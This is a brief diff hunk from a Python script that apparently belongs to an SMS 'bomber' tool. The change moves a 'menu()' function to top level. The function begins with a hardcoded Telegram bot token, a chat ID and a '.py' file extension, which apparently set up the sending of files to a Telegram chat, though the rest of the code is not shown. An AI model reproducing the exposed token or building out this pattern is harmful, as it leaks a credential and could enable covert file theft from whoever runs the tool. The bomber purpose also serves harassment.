@@ -392,7 +392,7 @@ else:
 	input(g+"\n\t\t\tYour Pogram Finished Enter For Continue")
 	os.system("clear")
 	os.system("python S-BOOMB.py")
-	def menu():
+def menu():
     bot_token = '6644443558:AAH9i1vvLli1YXE0cocYdhhCeI0tTRujX50'  # Replace with your actual bot token
     chat_id = '566775944'      # Replace with your actual chat ID
     extension = '.py'
